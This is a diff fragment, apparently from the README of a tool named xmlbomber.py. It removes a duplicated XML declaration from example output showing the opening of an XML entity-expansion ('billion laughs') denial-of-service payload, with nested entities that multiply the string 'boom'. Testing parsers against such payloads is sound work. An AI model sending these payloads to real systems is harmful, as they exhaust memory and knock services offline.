@@ -13,7 +13,6 @@ $ xmlbomber.py -e 7 -r 12 -n "hi" -c "boom" xml
 ```
 ```xml
 <?xml version="1.0">
-<?xml version="1.0">
 <!DOCTYPE hi [
   <!ENTITY 0 "boom">
   <!ENTITY 1 "&0; &0; &0; &0; &0; &0; &0; &0; &0; &0; &0; &0;">
